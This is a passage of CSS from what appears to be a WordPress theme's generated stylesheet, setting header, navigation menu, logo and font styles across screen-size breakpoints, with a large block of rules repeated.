991px) {	.ark-header .topbar-toggle-trigger {		height: 20px;		margin-top: 35px;		margin-bottom: 35px;	}}/* HORIZONTAL - TABLET */@media (min-width: 768px) and (max-width: 991px) {	.ark-header .navbar-toggle{		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (min-width: 768px) and (max-width: 991px) {	.ark-header .navbar-actions .navbar-actions-shrink {		line-height: 90px;	}}@media (min-width: 768px) and (max-width: 991px) {	header .navbar-logo-wrap img {		height: 45px !important;	}}@media (min-width: 768px) and (max-width: 991px) {	.wrapper-top-space-xs {		height: 90px;	}	.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px;		padding-bottom: 22.5px;	}}/* HORIZONTAL - MOBILE */@media (max-width: 767px) {	.ark-header .navbar-toggle{		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (max-width: 767px) {	.ark-header .navbar-actions .navbar-actions-shrink {		line-height: 90px;	}}@media (max-width: 767px) {	header .navbar-logo-wrap img {		height: 45px !important;	}}@media (max-width: 767px) {	.wrapper-top-space-xs {		height: 90px;	}	.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px;		padding-bottom: 22.5px;	}}/* FULLSCREEN */.ark-header.header-fullscreen .navbar-logo{	min-height: 1px !important;}.ark-header.header-fullscreen .navbar-logo-wrap{	width: 100% !important;}@media (max-width: 991px) {	.ark-header.header-fullscreen .header-fullscreen-nav-actions-right{		width: 30px;	}}/* VERTICAL */@media (max-width: 767px) {	.header-vertical .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (max-width: 767px) {	.header-section-scroll .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (max-width: 767px) {	header.ark-header-vertical .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px !important;		padding-bottom: 22.5px !important;	}}@media (max-width: 767px) {	header.ark-header-vertical .shopping-cart-wrapper {		margin-top: -55px;	}}@media (min-width: 768px) and (max-width: 991px) {	.header-vertical .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (min-width: 768px) and (max-width: 991px) {	.header-section-scroll .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (min-width: 768px) and (max-width: 991px) {	header.ark-header-vertical .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px !important;		padding-bottom: 22.5px !important;	}}@media (min-width: 768px) and (max-width: 991px) {	header.ark-header-vertical .shopping-cart-wrapper {		margin-top: -55px;	}}/* VERTICAL TEMPLATES */@media (max-width: 767px) {	.ark-header .ffb-header-template-item-vcenter{		height:  90px;	}}@media (min-width: 768px) and (max-width: 991px) {	.ark-header .ffb-header-template-item-vcenter{		height:  90px;	}}@media (min-width: 992px) {	.ark-header .ffb-header-template-item-vcenter{		height:  90px;	}	.ark-header.header-shrink .ffb-header-template-item-vcenter{		height: 70px;	}}/* HEADER HEIGHT FIX FOR IE */@media (min-width: 992px) {	.ark-header .navbar-nav .nav-item {		max-height: 90px;		overflow: visible;	}}/* LOGO JUMP OUT */.ffb-id-navigation-header .ffb-ark-first-level-menu{ text-transform: none !important;}.ffb-id-navigation-header .ffb-ark-first-level-menu:before,.ffb-id-navigation-header .ffb-ark-first-level-menu:after,.ffb-id-navigation-header .ffb-ark-first-level-menu:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu:focus,.ffb-id-navigation-header .ffb-ark-first-level-menu *,.ffb-id-navigation-header .ffb-ark-first-level-menu *:before,.ffb-id-navigation-header .ffb-ark-first-level-menu *:after,.ffb-id-navigation-header .ffb-ark-first-level-menu *:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu *:focus{ text-transform: none !important;}.ffb-id-navigation-header .ffb-ark-first-level-menu{ font-size: 14px !important;}.ffb-id-navigation-header .ffb-ark-first-level-menu ,.ffb-id-navigation-header .ffb-ark-first-level-menu:before,.ffb-id-navigation-header .ffb-ark-first-level-menu:after,.ffb-id-navigation-header .ffb-ark-first-level-menu:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu:focus,.ffb-id-navigation-header .ffb-ark-first-level-menu *,.ffb-id-navigation-header .ffb-ark-first-level-menu *:before,.ffb-id-navigation-header .ffb-ark-first-level-menu *:after,.ffb-id-navigation-header .ffb-ark-first-level-menu *:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu *:focus{ font-size: 14px !important;}@media (min-width:992px) { .ffb-id-navigation-header  .wrapper-top-space{ background-color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .navbar{ background-color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink){ background-color:transparent !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li>a.nav-item-child{ color:#333333;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li.current-menu-ancestor>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li.current-menu-item>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li.active>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li:hover>a.nav-item-child{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header .ark-header:not(.header-shrink) ul.dropdown-menu{ box-shadow:0 5px 20px rgba(0,0,0,0.06);}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .navbar{ background-color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink{ background-color:transparent !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .ff-ark-header-circle-shadow:before{ box-shadow: 0 0 15px rgba(0,0,50,0.09);}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li>a.nav-item-child{ color:#333333;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li.current-menu-ancestor>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li.current-menu-item>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li.active>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li:hover>a.nav-item-child{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header .ark-header.header-shrink ul.dropdown-menu{ box-shadow:0 5px 20px rgba(0,0,0,0.06);}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .navbar{ background-color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header{ background-color:transparent !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .ff-ark-header-circle-shadow:before{ box-shadow: 0 0 15px rgba(0,0,50,0.09);}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li>a.nav-item-child{ color:#333333;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li.current-menu-ancestor>a.nav-item-child{ color:#ffffff;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li.current-menu-item>a.nav-item-child{ color:#ffffff;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li.active>a.nav-item-child{ color:#ffffff;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li:hover>a.nav-item-child{ color:#ffffff !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width: 992px) { .wrapper-topbar-top-space, .wrapper-top-space { background-color:#cdd3b8}}/* RESETS - DO NOT CHANGE DYNAMICALLY */header .navbar-logo,header.header-shrink .navbar-logo {	line-height: 0 !important;}header .navbar-logo-wrap img {	max-height: none !important;}header .navbar-logo .navbar-logo-wrap {	transition-duration: 400ms;	transition-property: all;	transition-timing-function: cubic-bezier(0.7, 1, 0.7, 1);}@media (max-width: 991px){	header .navbar-logo .navbar-logo-img {		max-width: none !important;	}}@media (max-width: 991px){	.header .navbar-actions .navbar-actions-shrink {		max-height: none;	}}@media (min-width: 992px){	.header .navbar-actions .navbar-actions-shrink {		max-height: none;	}}@media (min-width: 992px) {	.header-shrink.ark-header .navbar-actions .navbar-actions-shrink {		max-height: none;	}}@media (max-width: 991px){	.header-fullscreen .header-fullscreen-col {		width: calc(100% - 60px);	}	.header-fullscreen .header-fullscreen-col.header-fullscreen-nav-actions-left {		width: 30px;	}}.ark-header .topbar-toggle-trigger {	padding: 0;}header .navbar-logo .navbar-logo-wrap {	transition-property: width, height, opacity, padding, margin-top, margin-bottom;}/* DYNAMIC OVERWRITES */.ark-header .navbar-logo .navbar-logo-wrap {	line-height: 1px;}@media (min-width: 992px) {	.wrapper>.wrapper-top-space {	height: 90px;	}	.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px;		padding-bottom: 22.5px;	}}@media (min-width: 992px) {	.header-shrink.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 12.5px;		padding-bottom: 12.5px;	}}@media (min-width: 992px) {	.ark-header .navbar-nav .nav-item {		line-height: 90px;	}	.ark-header .navbar-nav .nav-item ul {		line-height: 1.42857143;	}}@media (min-width: 992px) {	header .navbar-logo-wrap img {		height: 45px !important;	}}@media (min-width: 992px) {	header.header-shrink .navbar-logo-wrap img {		height: 45px !important;	}}.ark-header .navbar-actions .navbar-actions-shrink {	line-height: 89px;}@media (min-width: 992px){	.header-shrink.ark-header .navbar-actions .navbar-actions-shrink {		line-height: 69px;	}}@media (min-width: 992px) {	.ark-header.header-no-pills .navbar-nav .nav-item-child {		line-height: 90px;	}}@media (min-width: 992px) {	.ark-header.header-no-pills.header-shrink .navbar-nav .nav-item-child {		line-height: 70px;	}}@media (min-width: 992px) {	.ark-header.header-pills .navbar-nav .nav-item-child {		margin-top: 30px;		margin-bottom: 30px;	}}@media (min-width: 992px) {	.ark-header.header-pills.header-shrink .navbar-nav .nav-item-child {		margin-top: 20px;		margin-bottom: 20px;	}}@media (max-width: 767px) {	.header-fullscreen .header-fullscreen-nav-actions-left,	.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 30px;		padding-bottom: 30px;	}}@media (min-width: 768px) and (max-width: 991px) {	.header-fullscreen .header-fullscreen-nav-actions-left,	.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 30px;		padding-bottom: 30px;	}}@media (min-width: 992px) {	.header-fullscreen .header-fullscreen-nav-actions-left,	.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 30px;		padding-bottom: 30px;	}}@media (min-width: 992px) {	.header-shrink.header-fullscreen .header-fullscreen-nav-actions-left,	.header-shrink.header-fullscreen .header-fullscreen-nav-actions-right {		padding-top: 20px;		padding-bottom: 20px;	}}.ark-header.auto-hiding-navbar.nav-up {	top: -80px;}.ark-header.auto-hiding-navbar.nav-up.header-has-topbar {	top: -100%}.search-on-header-field .search-on-header-input {	height: 88px;}.header-shrink .search-on-header-field .search-on-header-input {	height: 68px;}@media (max-width: 767px) {	.search-on-header-field .search-on-header-input {		height: 90px;	}}@media (min-width: 768px) and (max-width: 991px) {	.search-on-header-field .search-on-header-input {		height: 90px;	}}@media (max-width: 767px) {	.ark-header .topbar-toggle-trigger {		height: 20px;		margin-top: 35px;		margin-bottom: 35px;	}}@media (min-width: 768px) and (max-width: 991px) {	.ark-header .topbar-toggle-trigger {		height: 20px;		margin-top: 35px;		margin-bottom: 35px;	}}/* HORIZONTAL - TABLET */@media (min-width: 768px) and (max-width: 991px) {	.ark-header .navbar-toggle{		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (min-width: 768px) and (max-width: 991px) {	.ark-header .navbar-actions .navbar-actions-shrink {		line-height: 90px;	}}@media (min-width: 768px) and (max-width: 991px) {	header .navbar-logo-wrap img {		height: 45px !important;	}}@media (min-width: 768px) and (max-width: 991px) {	.wrapper-top-space-xs {		height: 90px;	}	.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px;		padding-bottom: 22.5px;	}}/* HORIZONTAL - MOBILE */@media (max-width: 767px) {	.ark-header .navbar-toggle{		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (max-width: 767px) {	.ark-header .navbar-actions .navbar-actions-shrink {		line-height: 90px;	}}@media (max-width: 767px) {	header .navbar-logo-wrap img {		height: 45px !important;	}}@media (max-width: 767px) {	.wrapper-top-space-xs {		height: 90px;	}	.ark-header .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px;		padding-bottom: 22.5px;	}}/* FULLSCREEN */.ark-header.header-fullscreen .navbar-logo{	min-height: 1px !important;}.ark-header.header-fullscreen .navbar-logo-wrap{	width: 100% !important;}@media (max-width: 991px) {	.ark-header.header-fullscreen .header-fullscreen-nav-actions-right{		width: 30px;	}}/* VERTICAL */@media (max-width: 767px) {	.header-vertical .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (max-width: 767px) {	.header-section-scroll .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (max-width: 767px) {	header.ark-header-vertical .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px !important;		padding-bottom: 22.5px !important;	}}@media (max-width: 767px) {	header.ark-header-vertical .shopping-cart-wrapper {		margin-top: -55px;	}}@media (min-width: 768px) and (max-width: 991px) {	.header-vertical .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (min-width: 768px) and (max-width: 991px) {	.header-section-scroll .navbar-toggle {		margin-top: 32.5px;		margin-bottom: 32.5px;	}}@media (min-width: 768px) and (max-width: 991px) {	header.ark-header-vertical .navbar-logo .navbar-logo-wrap {		padding-top: 22.5px !important;		padding-bottom: 22.5px !important;	}}@media (min-width: 768px) and (max-width: 991px) {	header.ark-header-vertical .shopping-cart-wrapper {		margin-top: -55px;	}}/* VERTICAL TEMPLATES */@media (max-width: 767px) {	.ark-header .ffb-header-template-item-vcenter{		height:  90px;	}}@media (min-width: 768px) and (max-width: 991px) {	.ark-header .ffb-header-template-item-vcenter{		height:  90px;	}}@media (min-width: 992px) {	.ark-header .ffb-header-template-item-vcenter{		height:  90px;	}	.ark-header.header-shrink .ffb-header-template-item-vcenter{		height: 70px;	}}/* HEADER HEIGHT FIX FOR IE */@media (min-width: 992px) {	.ark-header .navbar-nav .nav-item {		max-height: 90px;		overflow: visible;	}}/* LOGO JUMP OUT */.ffb-id-navigation-header .ffb-ark-first-level-menu{ text-transform: none !important;}.ffb-id-navigation-header .ffb-ark-first-level-menu:before,.ffb-id-navigation-header .ffb-ark-first-level-menu:after,.ffb-id-navigation-header .ffb-ark-first-level-menu:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu:focus,.ffb-id-navigation-header .ffb-ark-first-level-menu *,.ffb-id-navigation-header .ffb-ark-first-level-menu *:before,.ffb-id-navigation-header .ffb-ark-first-level-menu *:after,.ffb-id-navigation-header .ffb-ark-first-level-menu *:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu *:focus{ text-transform: none !important;}.ffb-id-navigation-header .ffb-ark-first-level-menu{ font-size: 14px !important;}.ffb-id-navigation-header .ffb-ark-first-level-menu ,.ffb-id-navigation-header .ffb-ark-first-level-menu:before,.ffb-id-navigation-header .ffb-ark-first-level-menu:after,.ffb-id-navigation-header .ffb-ark-first-level-menu:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu:focus,.ffb-id-navigation-header .ffb-ark-first-level-menu *,.ffb-id-navigation-header .ffb-ark-first-level-menu *:before,.ffb-id-navigation-header .ffb-ark-first-level-menu *:after,.ffb-id-navigation-header .ffb-ark-first-level-menu *:hover,.ffb-id-navigation-header .ffb-ark-first-level-menu *:focus{ font-size: 14px !important;}@media (min-width:992px) { .ffb-id-navigation-header  .wrapper-top-space{ background-color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .navbar{ background-color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink){ background-color:transparent !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li>a.nav-item-child{ color:#333333;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li.current-menu-ancestor>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li.current-menu-item>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li.active>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) .menu-container>ul>li:hover>a.nav-item-child{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header:not(.header-shrink) ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header .ark-header:not(.header-shrink) ul.dropdown-menu{ box-shadow:0 5px 20px rgba(0,0,0,0.06);}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .navbar{ background-color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink{ background-color:transparent !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .ff-ark-header-circle-shadow:before{ box-shadow: 0 0 15px rgba(0,0,50,0.09);}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li>a.nav-item-child{ color:#333333;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li.current-menu-ancestor>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li.current-menu-item>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li.active>a.nav-item-child{ color:#ffffff;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink .menu-container>ul>li:hover>a.nav-item-child{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header  .ark-header.header-shrink ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (min-width:992px) { .ffb-id-navigation-header .ark-header.header-shrink ul.dropdown-menu{ box-shadow:0 5px 20px rgba(0,0,0,0.06);}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .navbar{ background-color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header{ background-color:transparent !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .ff-ark-header-circle-shadow:before{ box-shadow: 0 0 15px rgba(0,0,50,0.09);}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li>a.nav-item-child{ color:#333333;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li.current-menu-ancestor>a.nav-item-child{ color:#ffffff;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li.current-menu-item>a.nav-item-child{ color:#ffffff;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li.active>a.nav-item-child{ color:#ffffff;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header .menu-container>ul>li:hover>a.nav-item-child{ color:#ffffff !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list li.current-menu-ancestor>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list li.current-menu-item>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list li.active>a.ffb-ark-sub-level-menu{ color:#7e875f;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ color:#ffffff !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.dropdown-menu a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}@media (max-width:991px) { .ffb-id-navigation-header  .ark-header ul.mega-menu-list a.ffb-ark-sub-level-menu:hover{ background-color:#7e875f !important;}}.ffb-id-pfeamu7{ font-family: 'Libre Baskerville', Arial, sans-serif !important;}.ffb-id-pfeamu7:before,.ffb-id-pfeamu7:after,.ffb-id-pfeamu7:hover,.ffb-id-pfeamu7:focus,.ffb-id-pfeamu7 *,.ffb-id-pfeamu7 *:before,.ffb-id-pfeamu7 *:after,.ffb-id-pfeamu7 *:hover,.ffb-id-pfeamu7 *:focus{ font-family: 'Libre Baskerville', Arial, sans-serif !important;}.ffb-id-pfeamtm{ padding-top: 35px;padding-bottom: 35px;}.ffb-id-pfeamu1{ padding-top: 20px;padding-right: 20px;padding-bottom: 20px;padding-left: 20px;}.ffb-id-2t6rfdar .ff-lightbox-icon{ background-color: #ffffff !important;}.ffb-id-2t6rfdar .ff-lightbox-icon:hover{ background-color: #7e875f !important;}.ffb-id-2t6rfdar .cbp-item .cbp-item-wrapper{ background-color: #ffffff;}.ffb-id-2t6rfdar 